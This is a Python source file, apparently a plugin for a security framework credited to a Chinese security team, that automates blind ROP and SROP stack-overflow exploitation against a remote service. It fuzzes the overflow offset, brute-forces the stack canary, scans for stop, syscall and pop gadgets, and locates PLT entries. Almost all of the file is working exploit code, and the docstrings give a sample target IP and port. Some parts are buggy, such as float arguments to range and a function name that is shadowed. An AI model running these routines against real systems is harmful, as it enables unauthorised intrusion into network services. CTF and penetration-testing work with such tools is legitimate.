"""
BROP + SROP
支持对仅服务外露的多种脚本语言编写的程序进行栈溢出测试
by 星盟安全团队
"""

from sys import stdout
import levrt
from levrt import Cr, ctx, remote, annot, lev
from levrt.annot.cats import Attck, BlackArch
from pwn import *
from multiprocessing import Process
#context(log_level ='DEBUG')
context.arch = 'amd64'
file=bytes

def IPport(ip,port):
	try:
		p = remote(ip,int(port))
		p.close()
	except:
		print('\033[1;31;36m'"输入有误")
		return "wrong"
	return "ok"

def overflow(ip,port,flag='',until=b''):
	for i in range(255):
		try:
			p=remote(ip.strip("\n"),int(port.strip("\n")))
			#p = process('./TNT')
			p.recvuntil(until)
			p.sendline(b"a"*i)
			res = p.recvrepeat(timeout=1)
			i+=1
			print(res)
		#print(flag.strip("\n").encode())
			if flag.strip("\n").encode() in res:
				p.close()
				if i == 254:
					return "wrong"
				continue
			else:
				p.close()
				print('\033[1;31;31m'"长度为：",i-1)
				return i-1
				break
		except EOFError:
			p.close()
			print('\033[1;31;31m'"长度为：",i)
			return i
			# p.close()
			break

def text(prefix,ip,port,want,until):
	stop_final = []
	stop_gadget = []
	j = 1
	stop_temp_gadget = []
	for i in range(256):
		t = prefix + bytes([i])
		c = fuzz(t,ip,port,until,want)
		if c != "crash":
			if c == 'stop':
				stop_gadget.append(i.to_bytes(1,byteorder='little'))
	while j < 3:	
		for stop in stop_gadget:
			for i in range(256):
				t = prefix + stop + bytes([i])
				c = fuzz(t,ip,port,until,want)
				if c != "crash":
					print(stop+i.to_bytes(1,byteorder='little'), c)
					if c == 'stop':
						stop_temp_gadget.append(stop+i.to_bytes(1,byteorder='little'))
		stop_gadget = []
		for i in stop_temp_gadget:
			stop_gadget.append(i)
		stop_temp_gadget = []
		j = j + 1
	for i in stop_gadget:
		stop_final.append(int.from_bytes(i,'little'))
	return stop_final

def canary(bit,start,ip,port,overflow):
    p = remote(ip.strip("\n"),int(port.strip("\n")))
    canary = b'\x00'
    if bit == str(64):
        for i in range(bit / 8 - 1):
            for i in range(256):
                p.send(b'a' * overflow + canary + chr(i).encode('latin1'))
                a = p.recvall(timeout=1)
                if start in a:
                    canary += chr(i).encode('latin1')
                    break

    else:
        for i in range(bit / 8 - 1):
            for i in range(256):
                p.send(b'a' * overflow + canary + chr(i).encode('latin1'))
                a = p.recvall(timeout=1)
                if start in a:
                    canary += chr(i).encode('latin1')
                    break
    return canary

def find_syscall(ip,port,prefix,target,until,stop,want):
    try:
        sh = remote(ip.strip("\n"),int(port.strip("\n")))
        #sh = process('./TNT')
        frame = SigreturnFrame()
        frame.rax = 1
        frame.rdi = 1
        frame.rsi = target
        frame.rdx = 0x10
        frame.rip = target
        payload = prefix + p64(stop) + p64(target) + bytes(frame)
        sh.sendlineafter(until,payload)
        sleep(1)
        r = b''
        sh.send(b'a'*15)
        a = sh.recv(timeout=1)
        while a:
            r = r + a
            a = sh.recv(timeout=1)
        print(r)
        if r.startswith(b'\x0f\x05'):
            sh.close()
            return 'syscall'
        else:
            sh.close()
            return 'wrong'
    except EOFError:
        print(r)
        if r.startswith(b'\x0f\x05'):
            sh.close()
            return 'syscall'
        sh.close()
        return 'crash'

def GetPopGadgets(ip,port,prefix,stop,until,flag):
	addr = 0x400000
	pop = 0
	while addr < 0x40FFFF:
		try:
			io = remote(ip.strip("\n"),int(port.strip("\n")))
			#io = process('./TNT')
			io.recvuntil(until)
			payload = prefix + p64(addr) + p64(0)*6 + p64(stop)
			io.sendline(payload)
			out = b''
			output = io.recv(timeout=1)
			while output:
				out = out + output
				output = io.recv(timeout=1)
			print(out)
			io.close()
			#print(out.endswith(flag))
			if out.endswith(flag):
				try:
					io = remote(ip.strip("\n"),int(port.strip("\n")))
					#io = process('./TNT')
					io.recvuntil(until)
					#如果是第一种情况，此payload会出现异常
					payload = prefix + p64(addr) + p64(0)*6
					io.sendline(payload)
					out = b''
					output = io.recv(timeout=1)
					while output:
						out = out + output
						output = io.recv(timeout=1)
					io.close()
					addr += 1
				#出现异常，则说明前面的addr没问题
				except:
					io.close()
					pop = addr
					return addr
			else:
				addr = addr + 1
		#当try中，由于addr的地址不对应时，发生溢出。地址+1，继续循环。
		except:
			addr += 1
			continue

def Find_func_plt(ip,port,prefix,stop_gadget,brop_gadget,until):
    addr = 0x400000
    while True:
        try:
            sh = remote(ip.strip("\n"),int(port.strip("\n")))
            #sh = process('./TNT')
            sh.recvuntil(until)
            payload  = prefix
            payload += p64(brop_gadget+9) # pop rdi;ret;
            payload += p64(0x400000)
            payload += p64(addr)
            payload += p64(stop_gadget)
            sh.send(payload)
            if addr >= 0x40FFFF:
                print("All low byte is wrong!")
                return "wrong"
            res = sh.recvall(timeout=1)
            print(res)
            if b"ELF" in res:
                log.success(
                    "We found a function plt address is " + hex(addr)
                )
                sh.close()
                return addr
            sh.close()
            addr=addr+1
        except:
            addr = addr + 1
            pass

def fuzz(v,ip,port,until=b'',want=b''):
	try:
		# print(v,ip,port,until,want,sep="-----------")
		s=remote(ip.strip("\n"),int(port.strip("\n")))
		#s = process('./TNT')
		s.recvuntil(until)
		s.send(v)
		r = b''
		#r = s.recv()
		a = s.recv(timeout=1)
		while a:
			r = r + a
			a = s.recv(timeout=1)
		s.close()
		if (want is not None and want in r) or (want is None and len(r)>0):
			return "normal"
		else:
			return "stop"
	except EOFError:
		s.close()
		return "crash"
	return None

def syscall(stop_final,ip,port,prefix,until,want,syscall_gadget):
	stop_gadget_1 = stop_final
	available_stop = []
	for stop in stop_final:
		for target in stop_gadget_1: 
			ret = find_syscall(ip,port,prefix,target,until,stop,want)
			if ret == 'syscall':
				syscall_gadget.append(hex(target))
				available_stop.append(hex(stop))

@annot.meta(
    desc="brop", params=[
    annot.Param("ip", "ip"),
    annot.Param("port", "port"),
    annot.Param("flag", "message after send"),
    annot.Param("until", "message before send"),
    annot.Param("offset", "offset"),
    annot.Param("canary", "canary"),
    annot.Param("start", "start of message"),
])

async def brop(ip:str='',port:str='',flag:str='',until:file=b'',offset:int=0,canary:file=b'',start:str=''):
	"""
	normal brop
	'''
	brop('','','',b'',9,b'','')
	'''
	"""
	res = IPport(ip.strip("\n"),port.strip("\n"))
	global pop
	global func_plt
	if res == "wrong":
		print("ip or port wrong")
		await lev.doc.set(msg="ip or port wrong")
		exit()
	#offset = overflow(ip,port,flag,until)
	#if offset == "wrong":
	#	print("no overflow")
	#	exit()
	prefix = b'a'*offset + canary
	stop_final = []
	stop_gadget = []
	j = 1
	stop_temp_gadget = []
	for i in range(256):
		t = prefix + bytes([i])
		c = fuzz(t,ip,port,until,bytes(start,encoding='utf-8'))
		if c != "crash":
			if c == 'stop':
				stop_gadget.append(i.to_bytes(1,byteorder='little'))
				break
	while j < 3:	
		for stop in stop_gadget:
			for i in range(256):
				t = prefix + stop + bytes([i])
				c = fuzz(t,ip,port,until,bytes(start,encoding='utf-8'))
				if c != "crash":
					print(stop+i.to_bytes(1,byteorder='little'), c)
					if c == 'stop':
						stop_temp_gadget.append(stop+i.to_bytes(1,byteorder='little'))
						break
		stop_gadget = []
		for i in stop_temp_gadget:
			stop_gadget.append(i)
		stop_temp_gadget = []
		j = j + 1
	for i in stop_gadget:
		stop_final.append(int.from_bytes(i,'little'))
	#stop_final = text(prefix,ip,port,bytes(start,encoding='utf-8'),until)
	#p1 = Process(target=text, args=(prefix,ip,port,bytes(flag,encoding='utf-8'),until,))
	#p1.start()
	#p1.join()
	print(stop_final)
	#exit()
	if stop_final == []:
		print("no stop")
		await lev.doc.set(msg="no stop")
		exit()
	syscall_gadget = []
	#syscall(stop_final,ip,port,prefix,until,bytes(start,encoding='utf-8'),syscall_gadget)
	#p2 = Process(target=syscall, args=(stop_final,ip,port,prefix,until,want,syscall_gadget,))
	#p2.start()
	#p2.join()
	if syscall_gadget == []:
		print("no syscall")
		pop = GetPopGadgets(ip,port,prefix,stop_final[0],until,until)
		#p3 = Process(target=GetPopGadgets, args=(ip,port,prefix,stop_final[0],until,bytes(start,encoding='utf-8'),))
		#p3.start()
		#p3.join()
		print(hex(pop))
		if pop == 0:
			print("no pop")
			await lev.doc.set(msg="no pop")
			exit()
		func_plt = 0
		func_plt = Find_func_plt(ip,port,prefix,stop_final[0],pop,until)
		#p4 = Process(target=Find_func_plt, args=(prefix,stop_final[0],pop,until,))
		#p4.start()
		#p4.join()
		if func_plt == "wrong":
			print("no plt")
			await lev.doc.set(msg="no plt")
			exit()
		else:
			print("stop_gadget")
			print(stop_final)
			print("libc_csu_init")
			print(hex(pop))
			print("func_plt")
			print(hex(func_plt))
			print("program may have rop bug")
			await lev.doc.set(msg="program may have rop bug")

@annot.meta(
    desc="stop_syscall", params=[
    annot.Param("ip", "ip"),
    annot.Param("port", "port"),
    annot.Param("offset", "offset"),
    annot.Param("canary", "canary"),
    annot.Param("start", "start of message"),
    annot.Param("until", "message before send"),
])

async def stop_syscall(ip:str='',port:str='',offset:int=9,canary:file=b'',start:str='',until:file=b''):
	"""
	查找syscall
	```
	stop_syscall('','',9,b'','',b'')
	```
	"""
	res = IPport(ip.strip("\n"),port.strip("\n"))
	global pop
	global func_plt
	if res == "wrong":
		print("ip or port wrong")
		await lev.doc.set(msg="ip or port wrong")
		exit()
	prefix = b'a'*offset + canary
	stop_final = text(prefix,ip,port,bytes(start,encoding='utf-8'),until)
	#p1 = Process(target=text, args=(prefix,ip,port,bytes(flag,encoding='utf-8'),until,))
	#p1.start()
	#p1.join()
	print(stop_final)
	#exit()
	if stop_final == []:
		print("no stop")
		await lev.doc.set(msg="no stop")
		exit()
	syscall_gadget = []
	syscall(stop_final,ip,port,prefix,until,bytes(start,encoding='utf-8'),syscall_gadget)
	#p2 = Process(target=syscall, args=(stop_final,ip,port,prefix,until,want,syscall_gadget,))
	#p2.start()
	#p2.join()
	if syscall_gadget == []:
		print("no syscall")
		pop = GetPopGadgets(ip,port,prefix,stop_final[0],until,until)
		#p3 = Process(target=GetPopGadgets, args=(ip,port,prefix,stop_final[0],until,bytes(start,encoding='utf-8'),))
		#p3.start()
		#p3.join()
		print(hex(pop))
		if pop == 0:
			print("no pop")
			await lev.doc.set(msg="no pop")
			exit()
		func_plt = 0
		func_plt = Find_func_plt(ip,port,prefix,stop_final[0],pop,until)
		#p4 = Process(target=Find_func_plt, args=(prefix,stop_final[0],pop,until,))
		#p4.start()
		#p4.join()
		if func_plt == "wrong":
			print("no plt")
			await lev.doc.set(msg="no plt")
			exit()
		else:
			print("stop_gadget")
			print(stop_final)
			print("libc_csu_init")
			print(hex(pop))
			print("func_plt")
			print(hex(func_plt))
			print("program may have rop bug")
			await lev.doc.set(msg="program may have rop bug")
	else:
		print("syscall_gadget")
		print(syscall_gadget)
		print("stop_gadget")
		print(stop_final)
		print("program may have srop bug")
		await lev.doc.set(msg="program may have srop bug")

@annot.meta(
    desc="main", params=[
    annot.Param("ip", "ip"),
    annot.Param("port", "port"),
    annot.Param("flag", "message after send"),
    annot.Param("until", "message before send"),
    annot.Param("canary_flag", "whether has canary"),
    annot.Param("bit", "bit"),
    annot.Param("start", "start of message"),
])

async def main(ip:str='',port:str='',flag:str='',until:file=b'',canary_flag:bool=False,bit:int=64,start:str=''):
	"""
	基本模式，输入 ip 端口 回显信息 是否存在canary 位数使用
	```
	await main('1.14.71.254','28868','Goodbye',b'me:',False,64,'Hello')
	```
	按照设计逻辑自动测试
	"""
	res = IPport(ip.strip("\n"),port.strip("\n"))
	global pop
	global func_plt
	if res == "wrong":
		print("ip or port wrong")
		await lev.doc.set(msg="ip or port wrong")
		exit()
	offset = overflow(ip,port,flag,until)
	if offset == "wrong":
		print("no overflow")
		await lev.doc.set(msg="no overflow")
		exit()
	if canary_flag:
		canary = canary(bit,start,ip,port,offset)
		prefix = b'a'*offset + canary
	else:
		prefix = b'a'*offset
	stop_final = text(prefix,ip,port,bytes(start,encoding='utf-8'),until)
	#p1 = Process(target=text, args=(prefix,ip,port,bytes(flag,encoding='utf-8'),until,))
	#p1.start()
	#p1.join()
	print(stop_final)
	#exit()
	if stop_final == []:
		print("no stop")
		await lev.doc.set(msg="no stop")
		exit()
	syscall_gadget = []
	syscall(stop_final,ip,port,prefix,until,bytes(start,encoding='utf-8'),syscall_gadget)
	#p2 = Process(target=syscall, args=(stop_final,ip,port,prefix,until,want,syscall_gadget,))
	#p2.start()
	#p2.join()
	if syscall_gadget == []:
		print("no syscall")
		pop = GetPopGadgets(ip,port,prefix,stop_final[0],until,until)
		#p3 = Process(target=GetPopGadgets, args=(ip,port,prefix,stop_final[0],until,bytes(start,encoding='utf-8'),))
		#p3.start()
		#p3.join()
		print(hex(pop))
		if pop == 0:
			print("no pop")
			await lev.doc.set(msg="no pop")
			exit()
		func_plt = 0
		func_plt = Find_func_plt(ip,port,prefix,stop_final[0],pop,until)
		#p4 = Process(target=Find_func_plt, args=(prefix,stop_final[0],pop,until,))
		#p4.start()
		#p4.join()
		if func_plt == "wrong":
			print("no plt")
			await lev.doc.set(msg="no plt")
			exit()
		else:
			print("stop_gadget")
			print(stop_final)
			print("libc_csu_init")
			print(hex(pop))
			print("func_plt")
			print(hex(func_plt))
			print("program may have rop bug")
			await lev.doc.set(msg="program may have rop bug")
	else:
		print("syscall_gadget")
		print(syscall_gadget)
		print("stop_gadget")
		print(stop_final)
		print("program may have srop bug")
		await lev.doc.set(msg="program may have srop bug")

@annot.meta(
    desc="basic", params=[
    annot.Param("ip", "ip"),
    annot.Param("port", "port"),
    annot.Param("flag", "message after send"),
    annot.Param("until", "message before send"),
    annot.Param("canary_flag", "whether has canary"),
    annot.Param("bit", "bit"),
    annot.Param("start", "start of message"),
])
	
async def basic(ip:str='',port:str='',flag:str='',until:file=b'',canary_flag:bool=False,bit:int=0,start:str=''):
	"""
	检测是否栈溢出，以及基本栈溢出语句
	```
	await basic('1.14.71.254','28868','Goodbye',b'me:',False,64,'Hello')
	```
	"""
	res = IPport(ip.strip("\n"),port.strip("\n"))
	if res == "wrong":
		print("ip or port wrong")
		await lev.doc.set(msg="ip or port wrong")
		exit()
	offset = overflow(ip,port,flag,until)
	if offset == "wrong":
		print("no overflow")
		await lev.doc.set(msg="no overflow")
		exit()
	if canary_flag:
		canary = canary(bit,start,ip,port,offset)
		prefix = b'a'*offset + canary
	else:
		prefix = b'a'*offset
	print(prefix)
	await lev.doc.set(msg="prefix is {prefix}")
	
__lev__ = annot.meta([main,basic,brop,stop_syscall],
                     desc="sebrop",
                     cats={
                         Attck: [Attck.Reconnaissance],
                         BlackArch: [BlackArch.Scanner, BlackArch.Cracker]
                     })